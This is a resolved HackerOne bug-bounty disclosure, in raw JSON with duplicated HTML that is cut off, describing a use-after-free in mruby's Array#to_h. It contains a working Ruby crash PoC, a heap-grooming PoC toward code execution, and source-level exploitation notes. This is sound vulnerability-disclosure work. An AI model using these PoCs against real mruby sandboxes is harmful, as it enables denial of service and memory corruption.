{"id":181321,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODEzMjE=","url":"https://hackerone.com/reports/181321","title":"Use after free vulnerability in mruby Array#to_h causing DOS possible RCE","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2016-11-10T13:19:17.278Z","submitted_at":"2016-11-10T13:19:17.278Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"isra17","url":"/isra17","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-16T20:05:00.076Z","bug_reporter_agreed_on_going_public_at":"2016-12-16T20:05:00.029Z","team_member_agreed_on_going_public_at":"2016-12-16T19:46:22.718Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This bug was found with `jmlb337`.\n\n## Vulnerability \nThe function `to_h` will call the C function  `mrb_ary_to_h`.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call `to_ary` method of that object.  If `to_ary` does not return an array, the function will raise a ruby exception with the class name in the exception message.\n\nHowever, the code does not properly check that the array length was not modified during the call of `to_ary`. The vulnerability is triggered when the array is shrunk during call to `to_ary`, letting `mrb_ary_to_h` read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the `to_ary` call. A `mrb_obj_iv_set` call done on the controlled class pointer can be used to have a memory write leading to RCE.\n\n\n## Reproduction Step\n1. Define a new class that will define the method `to_ary`.\n2. in the `to_ary` clear a global array that will be later define and return a non array object.\n3. Create the global array containing an instance of the defined class.\n4. Call `to_h` on that array.\n\n## PoC DOS\n```ruby\nclass A\n  def to_ary\n    $a.clear\n    nil\n  end\nend\n$a = [A.new]\n$a.to_h\n```\nThis POC will cause a null memory access and terminate the mruby process.\n\n## Explaination\nThe bug is triggered due to call back to `to_ary` in [array.c:130](https://github.com/mruby/mruby/blob/master/mrbgems/mruby-array-ext/src/array.c#L130): \n```c\n v = mrb_check_array_type(mrb, RARRAY_PTR(ary)[i]);\n```\n\nThe function `mrb_check_array_type` check if the element at `RARRAY_PTR(ary)[i]`.  in the case of the POC it will be of type `A`.  It will then continue to call the `to_ary` method of the `A` class to convert the value into an array.\n\n```c\nMRB_API mrb_value\nmrb_check_array_type(mrb_state *mrb, mrb_value ary)\n{\n  return mrb_check_convert_type(mrb, ary, MRB_TT_ARRAY, \"Array\", \"to_ary\");\n}\n\nMRB_API mrb_value\nmrb_check_convert_type(mrb_state *mrb, mrb_value val, enum mrb_vtype type, const char *tname, const char *method)\n{\n  mrb_value v;\n\n  if (mrb_type(val) == type \u0026\u0026 type != MRB_TT_DATA) return val;\n  v = convert_type(mrb, val, tname, method, FALSE);\n  if (mrb_nil_p(v) || mrb_type(v) != type) return mrb_nil_value();\n  return v;\n}\n```\n\nBy calling the `Array#clear` method on the global array, the pointer to the array data (`ptr`) will be set to null.\n```c\nMRB_API mrb_value\nmrb_ary_clear(mrb_state *mrb, mrb_value self)\n{\n...\n  a-\u003elen = 0;\n  a-\u003eaux.capa = 0;\n  a-\u003eptr = 0;\n...\n```\n\nSince `to_ary` will not return an array, the C code will attempt to raise an exception with the class name in the exception message.\n```c\n if (mrb_nil_p(v)) {\n      mrb_raisef(mrb, E_TYPE_ERROR, \"wrong element type %S at %S (expected array)\",\n        mrb_str_new_cstr(mrb,  mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])),\n```\nwhen it calls `RARRAY_PTR(ary)[i]` it will attempt to reference `0[i]` and crash the process.\n\n## Exploitability\n\nThe vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.\n\n## Impact\n\nThis vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.\n\nWe are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with Fran√ßois Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug [#181319](https://hackerone.com/reports/181319) to get a memory disclosure.\n\n## Possible Remote Code Execution POC #2\n```ruby\n$size = 32\n$bb = []\nfor i in 0..256\n $bb.push(\"b\"*$size)\nend\n\nclass A\n def to_ary\n   $bb.clear\n   $a.clear\n   $a.push(\"b\"*256)\n   #first byte is 0 as long as the lsb != 1 its fine\n   $a.push(\"\\x00bcdefg\\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY\"*3 + (\"a\"*200))\n   $a.push(\"y\"*256)\n   $a.push(\"e\"*256)\n\n   return \"a\"\n end\nend\n\n$a = [[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],A.new]\n\nfor i in 0..256\n $bb.push(\"z\"*$size)\nend\n\n@a = $a.to_h\n```\n\n## Exploitation\nIn the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.\n\nafter clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.\n\nby pushing the large strings the data of the strings will be placed after the array data.  When the call is made to `mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])`,\nuser controlled data will be returned.  \n\nAn attacker could then craft an `mrb_value` object using the strings and cause farther memory corruption.\n\nThere exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.\n\n## Proposed Fix\n\nSee patch in attachment.\n","vulnerability_information_html":"\u003cp\u003eThis bug was found with \u003ccode\u003ejmlb337\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability\"\u003eVulnerability\u003c/h2\u003e\n\n\u003cp\u003eThe function \u003ccode\u003eto_h\u003c/code\u003e will call the C function  \u003ccode\u003emrb_ary_to_h\u003c/code\u003e.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call \u003ccode\u003eto_ary\u003c/code\u003e method of that object.  If \u003ccode\u003eto_ary\u003c/code\u003e does not return an array, the function will raise a ruby exception with the class name in the exception message.\u003c/p\u003e\n\n\u003cp\u003eHowever, the code does not properly check that the array length was not modified during the call of \u003ccode\u003eto_ary\u003c/code\u003e. The vulnerability is triggered when the array is shrunk during call to \u003ccode\u003eto_ary\u003c/code\u003e, letting \u003ccode\u003emrb_ary_to_h\u003c/code\u003e read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the \u003ccode\u003eto_ary\u003c/code\u003e call. A \u003ccode\u003emrb_obj_iv_set\u003c/code\u003e call done on the controlled class pointer can be used to have a memory write leading to RCE.\u003c/p\u003e\n\n\u003ch2 id=\"reproduction-step\"\u003eReproduction Step\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eDefine a new class that will define the method \u003ccode\u003eto_ary\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003ein the \u003ccode\u003eto_ary\u003c/code\u003e clear a global array that will be later define and return a non array object.\u003c/li\u003e\n\u003cli\u003eCreate the global array containing an instance of the defined class.\u003c/li\u003e\n\u003cli\u003eCall \u003ccode\u003eto_h\u003c/code\u003e on that array.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"poc-dos\"\u003ePoC DOS\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eA\u003c/span\u003e\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eto_ary\u003c/span\u003e\n    \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eclear\u003c/span\u003e\n    \u003cspan class=\"kp\"\u003enil\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eA\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_h\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis POC will cause a null memory access and terminate the mruby process.\u003c/p\u003e\n\n\u003ch2 id=\"explaination\"\u003eExplaination\u003c/h2\u003e\n\n\u003cp\u003eThe bug is triggered due to call back to \u003ccode\u003eto_ary\u003c/code\u003e in \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fblob%2Fmaster%2Fmrbgems%2Fmruby-array-ext%2Fsrc%2Farray.c%23L130\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003earray.c:130\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e \u003cspan class=\"n\"\u003ev\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_check_array_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eRARRAY_PTR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eary\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe function \u003ccode\u003emrb_check_array_type\u003c/code\u003e check if the element at \u003ccode\u003eRARRAY_PTR(ary)[i]\u003c/code\u003e.  in the case of the POC it will be of type \u003ccode\u003eA\u003c/code\u003e.  It will then continue to call the \u003ccode\u003eto_ary\u003c/code\u003e method of the \u003ccode\u003eA\u003c/code\u003e class to convert the value into an array.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eMRB_API\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e\n\u003cspan class=\"nf\"\u003emrb_check_array_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_state\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e \u003cspan class=\"n\"\u003eary\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_check_convert_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eary\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eMRB_TT_ARRAY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Array\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;to_ary\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eMRB_API\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e\n\u003cspan class=\"nf\"\u003emrb_check_convert_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_state\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003eenum\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_vtype\u003c/span\u003e \u003cspan class=\"n\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e \u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003eMRB_TT_DATA\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ev\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003econvert_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emethod\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eFALSE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_nil_p\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_nil_value\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBy calling the \u003ccode\u003eArray#clear\u003c/code\u003e method on the global array, the pointer to the array data (\u003ccode\u003eptr\u003c/code\u003e) will be set to null.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eMRB_API\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e\n\u003cspan class=\"nf\"\u003emrb_ary_clear\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_state\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emrb_value\u003c/span\u003e \u003cspan class=\"n\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003elen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eaux\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecapa\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince \u003ccode\u003eto_ary\u003c/code\u003e will not return an array, the C code will attempt to raise an exception with the class name in the exception message.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb_nil_p\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ev\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"n\"\u003emrb_raisef\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eE_TYPE_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;wrong element type %S at %S (expected array)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"n\"\u003emrb_str_new_cstr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e  \u003cspan class=\"n\"\u003emrb_obj_classname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emrb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eRARRAY_PTR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eary\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e])),\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewhen it calls \u003ccode\u003eRARRAY_PTR(ary)[i]\u003c/code\u003e it will attempt to reference \u003ccode\u003e0[i]\u003c/code\u003e and crash the process.\u003c/p\u003e\n\n\u003ch2 id=\"exploitability\"\u003eExploitability\u003c/h2\u003e\n\n\u003cp\u003eThe vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.\u003c/p\u003e\n\n\u003cp\u003eWe are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with Fran√ßois Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug \u003ca href=\"https://hackerone.com/reports/181319\"\u003e#181319\u003c/a\u003e to get a memory disclosure.\u003c/p\u003e\n\n\u003ch2 id=\"possible-remote-code-execution-poc-2\"\u003ePossible Remote Code Execution POC #2\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"vg\"\u003e$size\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$bb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e..\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\n \u003cspan class=\"vg\"\u003e$bb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;b\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"vg\"\u003e$size\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eA\u003c/span\u003e\n \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eto_ary\u003c/span\u003e\n   \u003cspan class=\"vg\"\u003e$bb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eclear\u003c/span\u003e\n   \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eclear\u003c/span\u003e\n   \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;b\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"c1\"\u003e#first byte is 0 as long as the lsb != 1 its fine\u003c/span\u003e\n   \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x00\u003c/span\u003e\u003cspan class=\"s2\"\u003ebcdefg\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x70\u003c/span\u003e\u003cspan class=\"s2\"\u003ehijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n   \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;y\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n   \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\n \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"vg\"\u003e$a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan 